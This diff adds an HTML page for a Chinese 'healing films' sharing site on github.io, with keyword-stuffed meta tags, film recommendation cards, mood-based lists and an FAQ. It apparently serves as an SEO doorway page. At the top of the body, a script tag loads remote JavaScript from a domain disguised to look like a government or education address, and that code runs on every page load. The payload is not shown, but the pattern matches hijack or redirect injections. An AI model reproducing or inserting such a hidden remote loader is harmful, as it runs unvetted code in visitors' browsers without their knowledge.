@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>桃子电影网 | taozidianyingwang-zh.github.io — 清新治愈系影视分享社区</title>
+<meta name="keywords" content="桃子电影网,taozidianyingwang-zh.github.io,桃子电影网在线观影,清新电影推荐,治愈系影视合集,青春爱情片精选,小众独立电影,高分文艺片,桃子电影网片单,周末观影指南,2026最新电影推荐,影视爱好者社区">
+<meta name="description" content="桃子电影网（taozidianyingwang-zh.github.io）是一个清新治愈系影视分享社区，专为热爱生活、热爱电影的你而建。我们不追热点、不炒热度，只用心挑选那些温暖、真诚、有力量的影视作品。从青春爱情到治愈系日剧，从独立短片到高分文艺片，桃子电影网用一份份精心整理的片单，陪你度过每一个值得被电影温柔以待的午后。来桃子电影网吧，在快节奏的生活里，给自己一段慢下来的观影时光。">
+<meta name="robots" content="index,follow">
+<meta name="author" content="桃子电影网">
+<meta name="renderer" content="webkit">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<style>
+/* ===== Reset & Base ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+--peach:#ff8fa3;
+--peach-light:#ffc2d1;
+--peach-pale:#ffe5ec;
+--peach-deep:#e85d7a;
+--leaf:#a8d5ba;
+--leaf-deep:#7bb98f;
+--cream:#fff9f5;
+--ink:#3d2b2b;
+--ink-soft:#6b5b5b;
+--shadow-card:0 4px 24px rgba(232,93,122,0.10);
+--shadow-hover:0 12px 40px rgba(232,93,122,0.22);
+--r-lg:24px;
+--r-md:16px;
+--r-sm:10px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{
+font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Segoe UI",sans-serif;
+background:var(--cream);
+color:var(--ink);
+line-height:1.8;
+font-size:15px;
+overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;}
+ul{list-style:none;}
+
+/* ===== Container ===== */
+.container{max-width:1100px;margin:0 auto;padding:0 20px;}
+
+/* ===== Floating Peach Decor ===== */
+.float-peach{
+position:fixed;font-size:1.6rem;opacity:0.12;z-index:0;pointer-events:none;
+animation:float 8s ease-in-out infinite;
+}
+.float-peach:nth-child(1){top:12%;left:4%;animation-delay:0s;}
+.float-peach:nth-child(2){top:35%;right:5%;animation-delay:2s;}
+.float-peach:nth-child(3){top:65%;left:6%;animation-delay:4s;}
+.float-peach:nth-child(4){bottom:15%;right:8%;animation-delay:1.5s;}
+@keyframes float{
+0%,100%{transform:translateY(0) rotate(-5deg);}
+50%{transform:translateY(-18px) rotate(8deg);}
+}
+
+/* ===== Header ===== */
+header{
+position:sticky;top:0;z-index:50;
+background:rgba(255,249,245,0.85);
+backdrop-filter:saturate(180%) blur(14px);
+border-bottom:1px solid rgba(255,143,163,0.18);
+}
+.header-inner{
+max-width:1100px;margin:0 auto;padding:0 20px;
+display:flex;align-items:center;justify-content:space-between;
+height:60px;
+}
+.logo{
+display:flex;align-items:center;gap:10px;
+font-size:1.25rem;font-weight:800;color:var(--peach-deep);
+letter-spacing:0.5px;
+}
+.logo-emoji{font-size:1.6rem;}
+.nav{display:flex;gap:6px;align-items:center;}
+.nav a{
+padding:8px 14px;border-radius:20px;font-size:0.85rem;
+color:var(--ink-soft);transition:all .25s;
+}
+.nav a:hover{background:var(--peach-pale);color:var(--peach-deep);}
+.mobile-toggle{display:none;background:none;border:none;cursor:pointer;padding:6px;}
+.mobile-toggle span{display:block;width:24px;height:2.5px;background:var(--peach-deep);margin:5px 0;border-radius:2px;}
+
+/* ===== Hero ===== */
+.hero{
+position:relative;padding:90px 20px 80px;text-align:center;overflow:hidden;
+background:
+radial-gradient(ellipse at 50% 0%,var(--peach-pale) 0%,transparent 60%),
+var(--cream);
+}
+.hero-badge{
+display:inline-flex;align-items:center;gap:8px;
+background:#fff;border:1.5px solid var(--peach-light);
+border-radius:30px;padding:8px 20px;
+font-size:0.82rem;color:var(--peach-deep);
+margin-bottom:24px;
+box-shadow:0 2px 12px rgba(255,143,163,0.15);
+}
+.hero-badge .dot{width:8px;height:8px;border-radius:50%;background:var(--leaf-deep);}
+.hero h1{
+font-size:clamp(2rem,6vw,3.8rem);
+font-weight:900;letter-spacing:-1px;line-height:1.15;
+margin-bottom:18px;
+}
+.hero h1 .highlight{
+background:linear-gradient(120deg,var(--peach),var(--peach-deep));
+-webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero-sub{
+font-size:clamp(0.95rem,2vw,1.15rem);
+color:var(--ink-soft);max-width:560px;margin:0 auto 36px;
+}
+.hero-actions{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;}
+.btn{
+display:inline-flex;align-items:center;gap:8px;
+padding:14px 32px;border-radius:30px;
+font-size:0.9rem;font-weight:600;
+transition:all .3s;
+}
+.btn-primary{background:var(--peach);color:#fff;box-shadow:0 4px 16px rgba(255,143,163,0.4);}
+.btn-primary:hover{background:var(--peach-deep);transform:translateY(-2px);box-shadow:0 8px 24px rgba(232,93,122,0.4);}
+.btn-outline{background:#fff;color:var(--peach-deep);border:1.5px solid var(--peach-light);}
+.btn-outline:hover{border-color:var(--peach-deep);background:var(--peach-pale);}
+
+/* ===== Section ===== */
+section{padding:70px 0;position:relative;z-index:1;}
+.sec-title{text-align:center;margin-bottom:44px;}
+.sec-title .ico{font-size:2rem;margin-bottom:8px;display:block;}
+.sec-title h2{
+font-size:clamp(1.4rem,3.5vw,2.1rem);font-weight:800;letter-spacing:-0.5px;
+}
+.sec-title p{color:var(--ink-soft);font-size:0.9rem;margin-top:8px;}
+
+/* ===== Picks (卡片网格) ===== */
+.picks-grid{
+display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+gap:22px;
+}
+.pick-card{
+background:#fff;border-radius:var(--r-lg);
+overflow:hidden;box-shadow:var(--shadow-card);
+transition:all .35s cubic-bezier(0.4,0,0.2,1);
+}
+.pick-card:hover{transform:translateY(-6px);box-shadow:var(--shadow-hover);}
+.pick-thumb{
+height:180px;display:flex;flex-direction:column;justify-content:flex-end;
+padding:20px;position:relative;overflow:hidden;
+}
+.pick-thumb::before{
+content:'';position:absolute;inset:0;
+background:linear-gradient(170deg,var(--c1,var(--peach)) 0%,var(--c2,var(--peach-deep)) 100%);
+}
+.pick-thumb::after{
+content:'';position:absolute;top:-30%;right:-20%;
+width:120px;height:120px;border-radius:50%;
+background:rgba(255,255,255,0.12);
+}
+.pick-thumb .pt-emoji{font-size:2.2rem;z-index:2;position:relative;}
+.pick-thumb .pt-cat{
+z-index:2;position:relative;
+font-size:0.72rem;color:rgba(255,255,255,0.85);
+letter-spacing:1px;margin-top:6px;
+}
+.pick-info{padding:18px 20px;}
+.pick-info h3{font-size:1.05rem;font-weight:700;margin-bottom:6px;}
+.pick-info p{font-size:0.82rem;color:var(--ink-soft);line-height:1.65;}
+.pick-meta{
+display:flex;justify-content:space-between;align-items:center;
+margin-top:12px;padding-top:12px;
+border-top:1px dashed var(--peach-light);
+font-size:0.75rem;color:var(--peach-deep);
+}
+
+/* ===== Mood Tabs ===== */
+.mood-wrap{background:var(--peach-pale);border-radius:var(--r-lg);padding:40px 30px;}
+.mood-grid{
+display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+gap:16px;
+}
+.mood-item{
+background:#fff;border-radius:var(--r-md);padding:24px 18px;text-align:center;
+transition:all .3s;cursor:default;
+}
+.mood-item:hover{background:var(--peach);transform:scale(1.03);}
+.mood-item:hover h4,.mood-item:hover p{color:#fff;}
+.mood-item .m-emoji{font-size:2rem;margin-bottom:8px;}
+.mood-item h4{font-size:0.95rem;font-weight:700;margin-bottom:4px;transition:color .3s;}
+.mood-item p{font-size:0.78rem;color:var(--ink-soft);transition:color .3s;}
+
+/* ===== Quote Banner ===== */
+.quote-banner{
+background:linear-gradient(135deg,var(--peach),var(--peach-deep));
+border-radius:var(--r-lg);padding:48px 30px;text-align:center;color:#fff;
+}
+.quote-banner .q-text{
+font-size:clamp(1.1rem,2.5vw,1.5rem);font-weight:600;line-height:1.7;
+max-width:700px;margin:0 auto;
+}
+.quote-banner .q-src{margin-top:16px;font-size:0.85rem;opacity:0.85;}
+
+/* ===== List Section ===== */
+.list-row{
+background:#fff;border-radius:var(--r-md);padding:22px 26px;
+margin-bottom:14px;box-shadow:var(--shadow-card);
+display:flex;gap:18px;align-items:flex-start;
+transition:all .3s;
+}
+.list-row:hover{box-shadow:var(--shadow-hover);transform:translateX(4px);}
+.list-num{
+flex-shrink:0;width:42px;height:42px;border-radius:12px;
+background:var(--peach-pale);color:var(--peach-deep);
+display:flex;align-items:center;justify-content:center;
+font-size:1.1rem;font-weight:800;
+}
+.list-body h4{font-size:1rem;font-weight:700;margin-bottom:4px;}
+.list-body p{font-size:0.82rem;color:var(--ink-soft);}
+.list-tag{
+flex-shrink:0;font-size:0.72rem;background:var(--leaf);color:#fff;
+padding:4px 12px;border-radius:20px;white-space:nowrap;
+}
+
+/* ===== FAQ ===== */
+.faq-item{
+background:#fff;border-radius:var(--r-md);margin-bottom:12px;
+box-shadow:var(--shadow-card);overflow:hidden;
+}
+.faq-q{
+padding:18px 24px;font-weight:600;font-size:0.95rem;
+cursor:pointer;display:flex;justify-content:space-between;align-items:center;
+}
+.faq-q .arrow{color:var(--peach-deep);font-size:1.2rem;transition:transform .3s;}
+.faq-item.open .arrow{transform:rotate(45deg);}
+.faq-a{
+max-height:0;overflow:hidden;transition:max-height .4s ease;
+}
+.faq-a-inner{padding:0 24px 20px;font-size:0.85rem;color:var(--ink-soft);line-height:1.75;}
+
+/* ===== URL Showcase ===== */
+.url-showcase{text-align:center;}
+.url-bubble{
+display:inline-block;background:#fff;border:2px solid var(--peach-light);
+border-radius:var(--r-lg);padding:30px 48px;margin-bottom:32px;
+box-shadow:var(--shadow-card);
+}
+.url-bubble .label{font-size:0.78rem;color:var(--ink-soft);letter-spacing:2px;margin-bottom:6px;}
+.url-bubble .url{
+font-size:clamp(1rem,2.5vw,1.35rem);font-weight:700;
+color:var(--peach-deep);letter-spacing:0.5px;
+word-break:break-all;
+}
+.url-cards{
+display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+gap:18px;margin-top:32px;
+}
+.url-card{
+background:#fff;border-radius:var(--r-md);padding:24px 18px;
+box-shadow:var(--shadow-card);transition:all .3s;
+}
+.url-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-hover);}
+.url-card .uc-emoji{font-size:1.8rem;margin-bottom:8px;}
+.url-card h4{font-size:0.9rem;margin-bottom:4px;}
+.url-card p{font-size:0.78rem;color:var(--ink-soft);}
+
+/* ===== Footer ===== */
+footer{
+background:var(--ink);color:rgba(255,255,255,0.6);
+padding:50px 20px 28px;font-size:0.82rem;
+}
+.foot-inner{max-width:1100px;margin:0 auto;}
+.foot-top{display:flex;justify-content:space-between;flex-wrap:wrap;gap:30px;margin-bottom:32px;}
+.foot-brand{display:flex;align-items:center;gap:10px;font-size:1.15rem;font-weight:700;color:#fff;margin-bottom:8px;}
+.foot-brand .logo-emoji{font-size:1.5rem;}
+.foot-links{display:flex;gap:28px;flex-wrap:wrap;}
+.foot-links a{color:rgba(255,255,255,0.5);transition:color .2s;}
+.foot-links a:hover{color:var(--peach-light);}
+.foot-bottom{
+border-top:1px solid rgba(255,255,255,0.1);padding-top:20px;
+display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;
+}
+
+/* ===== Responsive ===== */
+@media(max-width:768px){
+.mobile-toggle{display:block;}
+.nav{
+position:fixed;top:60px;left:0;right:0;
+flex-direction:column;gap:0;align-items:stretch;
+background:rgba(255,249,245,0.97);
+backdrop-filter:blur(14px);
+max-height:0;overflow:hidden;
+transition:max-height .35s ease;
+border-bottom:1px solid rgba(255,143,163,0.15);
+}
+.nav.open{max-height:400px;}
+.nav a{padding:14px 24px;border-radius:0;border-bottom:1px solid rgba(255,143,163,0.08);}
+.hero{padding:60px 20px 56px;}
+.list-row{flex-direction:column;gap:10px;}
+.list-tag{align-self:flex-start;}
+}
+@media(max-width:420px){
+.url-bubble{padding:20px 24px;}
+.foot-links{gap:16px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- Decorative floating elements -->
+<div class="float-peach">🍑</div>
+<div class="float-peach">🌸</div>
+<div class="float-peach">🍑</div>
+<div class="float-peach">🌷</div>
+
+<!-- Header -->
+<header>
+<div class="header-inner">
+<a href="#" class="logo"><span class="logo-emoji">🍑</span>桃子电影网</a>
+<nav class="nav" id="nav">
+<a href="#picks">精选推荐</a>
+<a href="#mood">心情片单</a>
+<a href="#list">经典榜单</a>
+<a href="#faq">常见问题</a>
+<a href="#url">访问网址</a>
+</nav>
+<button class="mobile-toggle" id="toggle" aria-label="菜单"><span></span><span></span><span></span></button>
+</div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+<div class="hero-badge"><span class="dot"></span> 2026 全新改版 · 治愈系影视社区</div>
+<h1>每一部好电影<br>都像一颗<span class="highlight">甜桃子</span> 🍑</h1>
+<p class="hero-sub">桃子电影网（taozidianyingwang-zh.github.io）是一个清新、温暖、不焦虑的影视分享社区。我们不追热点，只用心挑选那些值得被看见的好作品。</p>
+<div class="hero-actions">
+<a href="#picks" class="btn btn-primary">看看精选片单 →</a>
+<a href="#url" class="btn btn-outline">访问桃子电影网</a>
+</div>
+</section>
+
+<!-- Picks -->
+<section id="picks">
+<div class="container">
+<div class="sec-title">
+<span class="ico">🎬</span>
+<h2>编辑精选</h2>
+<p>每周更新，用心挑选那些温暖、真诚、有力量的影视作品</p>
+</div>
+<div class="picks-grid">
+
+<div class="pick-card">
+<div class="pick-thumb" style="--c1:#ff9a9e;--c2:#fad0c4;">
+<span class="pt-emoji">🌸</span>
+<span class="pt-cat">青春 · 治愈</span>
+</div>
+<div class="pick-info">
+<h3>四月物语</h3>
+<p>关于暗恋、关于春天、关于那些说不出口的心动。一部适合在午后一个人静静看完的小品式青春片。</p>
+<div class="pick-meta"><span>📅 2025</span><span>⭐ 9.1</span></div>
+</div>
+</div>
+
+<div class="pick-card">
+<div class="pick-thumb" style="--c1:#a18cd1;--c2:#fbc2eb;">
+<span class="pt-emoji">🌙</span>
+<span class="pt-cat">文艺 · 梦境</span>
+</div>
+<div class="pick-info">
+<h3>夜航西飞</h3>
+<p>一位女飞行员的独白式回忆录改编。影片用诗意的长镜头，讲述孤独、勇气与自我和解。</p>
+<div class="pick-meta"><span>📅 2024</span><span>⭐ 8.7</span></div>
+</div>
+</div>
+
+<div class="pick-card">
+<div class="pick-thumb" style="--c1:#ffecd2;--c2:#fcb69f;">
+<span class="pt-emoji">☀️</span>
+<span class="pt-cat">喜剧 · 生活</span>
+</div>
+<div class="pick-info">
+<h3>面包与玫瑰</h3>
+<p>一间社区面包店里发生的温暖故事。没有大起大落，只有人与人之间最朴素的理解和善意。</p>
+<div class="pick-meta"><span>📅 2025</span><span>⭐ 8.9</span></div>
+</div>
+</div>
+
+<div class="pick-card">
+<div class="pick-thumb" style="--c1:#84fab0;--c2:#8fd3f4;">
+<span class="pt-emoji">🌊</span>
+<span class="pt-cat">自然 · 纪录</span>
+</div>
+<div class="pick-info">
+<h3>潮汐之间</h3>
+<p>用三年时间记录一片海岸线的四季变化，以及生活在这里的渔民家庭。安静、克制，却直击心灵。</p>
+<div class="pick-meta"><span>📅 2024</span><span>⭐ 9.3</span></div>
+</div>
+</div>
+
+<div class="pick-card">
+<div class="pick-thumb" style="--c1:#fccb90;--c2:#d57eeb;">
+<span class="pt-emoji">💌</span>
+<span class="pt-cat">爱情 · 书信</span>
+</div>
+<div class="pick-info">
+<h3>迟到的信</h3>
+<p>两代人之间跨越三十年的通信。当孙女读到奶奶年轻时写的信，她重新认识了那个"古板"的老人。</p>
+<div class="pick-meta"><span>📅 2026</span><span>⭐ 8.8</span></div>
+</div>
+</div>
+
+<div class="pick-card">
+<div class="pick-thumb" style="--c1:#e0c3fc;--c2:#8ec5fc;">
+<span class="pt-emoji">🎨</span>
+<span class="pt-cat">动画 · 独立</span>
+</div>
+<div class="pick-info">
+<h3>纸飞机</h3>
+<p>一部手绘动画短片合集，讲述城市里五个陌生人的偶然交汇。画面温柔，情绪细腻，适合失眠的夜晚。</p>
+<div class="pick-meta"><span>📅 2025</span><span>⭐ 9.0</span></div>
+</div>
+</div>
+
+</div>
+</div>
+</section>
+
+<!-- Mood -->
+<section id="mood" style="background:var(--cream);">
+<div class="container">
+<div class="sec-title">
+<span class="ico">🎭</span>
+<h2>按心情选片</h2>
+<p>不知道看什么？跟着心情走，总有一部适合此刻的你</p>
+</div>
+<div class="mood-wrap">
+<div class="mood-grid">
+<div class="mood-item"><span class="m-emoji">😊</span><h4>开心一下</h4><p>轻松喜剧、暖心日常，赶走坏情绪</p></div>
+<div class="mood-item"><span class="m-emoji">😢</span><h4>想哭一场</h4><p>治愈催泪、亲情羁绊，释放内心压力</p></div>
+<div class="mood-item"><span class="m-emoji">😴</span><h4>助眠陪伴</h4><p>慢节奏文艺片，适合睡前安静观看</p></div>
+<div class="mood-item"><span class="m-emoji">🤔</span><h4>烧脑思考</h4><p>剧情反转、社会议题，看完想聊三天</p></div>
+<div class="mood-item"><span class="m-emoji">💕</span><h4>约会必看</h4><p>浪漫爱情、甜蜜互动，适合两人共享</p></div>
+<div class="mood-item"><span class="m-emoji">🌿</span><h4>周末放松</h4><p>自然纪录、慢生活，给心灵放个假</p></div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- Quote -->
+<section style="padding:0;">
+<div class="container">
+<div class="quote-banner">
+<p class="q-text">"电影是生活的止痛药，也是生活的解药。<br>桃子电影网想做的，就是在你需要的时候，递给你一颗刚刚好的桃子。"</p>
+<p class="q-src">— 桃子电影网 · 编辑部</p>
+</div>
+</div>
+</section>
+
+<!-- List -->
+<section id="list">
+<div class="container">
+<div class="sec-title">
+<span class="ico">🏆</span>
+<h2>桃子电影网 · 经典榜单</h2>
+<p>那些被时间验证过的、值得反复观看的影视佳作</p>
+</div>
+
+<div class="list-row">
+<span class="list-num">1</span>
+<div class="list-body">
+<h4>小森林 夏秋篇</h4>
+<p>市子回到东北部的老家，用料理治愈自己。每一道菜都是一封写给故乡的情书。</p>
+</div>
+<span class="list-tag">治愈美食</span>
+</div>
+
+<div class="list-row">
+<span class="list-num">2</span>
+<div class="list-body">
+<h4>海街日记</h4>
+<p>四姐妹在镰仓的老屋中共同生活，用日常的琐碎拼凑出家庭的完整模样。</p>
+</div>
+<span class="list-tag">家庭温情</span>
+</div>
+
+<div class="list-row">
+<span class="list-num">3</span>
+<div class="list-body">
+<h4>心灵奇旅</h4>
+<p>关于"生活的火花"究竟是什么。看完你会想重新审视自己每一天的方式。</p>
+</div>
+<span class="list-tag">动画佳作</span>
+</div>
+
+<div class="list-row">
+<span class="list-num">4</span>
+<div class="list-body">
+<h4>瀑布</h4>
+<p>疫情之下母女关系的变化。安静地讲述一个家庭的裂缝与弥合。</p>
+</div>
+<span class="list-tag">华语精选</span>
+</div>
+
+<div class="list-row">
+<span class="list-num">5</span>
+<div class="list-body">
+<h4>完美的日子</h4>
+<p>东京公厕清洁工平山的一天。在极简中发现生活的诗意与尊严。</p>
+</div>
+<span class="list-tag">人生哲思</span>
+</div>
+
+</div>
+</section>
+
+<!-- FAQ -->
+<section id="faq" style="background:var(--peach-pale);">
+<div class="container">
+<div class="sec-title">
+<span class="ico">❓</span>
+<h2>常见问题</h2>
+<p>关于桃子电影网，你可能想知道的这些事</p>
+</div>
+
+<div class="faq-item">
+<div class="faq-q">桃子电影网是什么？<span class="arrow">＋</span></div>
+<div class="faq-a"><div class="faq-a-inner">桃子电影网（taozidianyingwang-zh.github.io）是一个清新治愈系的影视分享社区。我们用心挑选温暖、真诚、有力量的影视作品，配以片单推荐和观后随笔，陪你度过每一个值得被电影温柔以待的时刻。</div></div>
+</div>
+
+<div class="faq-item">
+<div class="faq-q">片单多久更新一次？<span class="arrow">＋</span></div>
+<div class="faq-a"><div class="faq-a-inner">编辑团队每周更新精选片单，每月整理一份主题合集。热门新片和经典重温都会覆盖，确保你永远有新鲜内容可看。</div></div>
+</div>
+
+<div class="faq-item">
+<div class="faq-q">如何选择适合自己的电影？<span class="arrow">＋</span></div>
+<div class="faq-a"><div class="faq-a-inner">可以前往"按心情选片"栏目，根据自己的当下状态选择对应分类。也可以浏览"经典榜单"，那里是经时间验证的必看佳作。</div></div>
+</div>
+
+<div class="faq-item">
+<div class="faq-q">可以在手机上浏览吗？<span class="arrow">＋</span></div>
+<div class="faq-a"><div class="faq-a-inner">当然可以！桃子电影网全站采用响应式设计，无论是手机、平板还是电脑，都能获得流畅舒适的浏览体验。</div></div>
+</div>
+
+</div>
+</section>
+
+<!-- URL Showcase -->
+<section id="url" class="url-showcase">
+<div class="container">
+<div class="sec-title">
+<span class="ico">🔗</span>
+<h2>访问桃子电影网</h2>
+<p>请收藏我们的官方网址，随时随地享受治愈观影时光</p>
+</div>
+<div class="url-bubble">
+<div class="label">OFFICIAL WEBSITE</div>
+<div class="url">taozidianyingwang-zh.github.io</div>
+</div>
+<div class="url-cards">
+<div class="url-card"><span class="uc-emoji">📱</span><h4>手机随时看</h4><p>移动端完美适配，通勤路上也能刷片单</p></div>
+<div class="url-card"><span class="uc-emoji">💻</span><h4>大屏更沉浸</h4><p>电脑端排版舒适，适合慢慢阅读影评</p></div>
+<div class="url-card"><span class="uc-emoji">📬</span><h4>收藏不迷路</h4><p>建议将网址加入书签，第一时间获取更新</p></div>
+<div class="url-card"><span class="uc-emoji">🍑</span><h4>纯净无打扰</h4><p>清爽浏览体验，专注于好电影本身</p></div>
+</div>
+</div>
+</section>
+
+<!-- Footer -->
+<footer>
+<div class="foot-inner">
+<div class="foot-top">
+<div>
+<div class="foot-brand"><span class="logo-emoji">🍑</span> 桃子电影网</div>
+<p>一个清新治愈系的影视分享社区<br>用心挑选每一部值得被看见的好作品</p>
+</div>
+<div class="foot-links">
+<a href="#picks">精选推荐</a>
+<a href="#mood">心情片单</a>
+<a href="#list">经典榜单</a>
+<a href="#faq">常见问题</a>
+<a href="#url">访问网址</a>
+</div>
+</div>
+<div class="foot-bottom">
+<p>© 2026 桃子电影网 · taozidianyingwang-zh.github.io · 用心分享好电影</p>
+<p>本网站内容仅供影视爱好者交流分享</p>
+</div>
+</div>
+</footer>
+
+<script>
+// Mobile nav
+document.getElementById('toggle').addEventListener('click',function(){
+document.getElementById('nav').classList.toggle('open');
+});
+document.querySelectorAll('.nav a').forEach(function(a){
+a.addEventListener('click',function(){
+document.getElementById('nav').classList.remove('open');
+});
+});
+
+// FAQ accordion
+document.querySelectorAll('.faq-q').forEach(function(q){
+q.addEventListener('click',function(){
+var item=q.parentElement;
+var ans=item.querySelector('.faq-a');
+var isOpen=item.classList.contains('open');
+// close all
+document.querySelectorAll('.faq-item').forEach(function(i){
+i.classList.remove('open');
+i.querySelector('.faq-a').style.maxHeight=null;
+});
+if(!isOpen){
+item.classList.add('open');
+ans.style.maxHeight=ans.scrollHeight+40+'px';
+}
+});
+});
+</script>
+</body>
+</html>
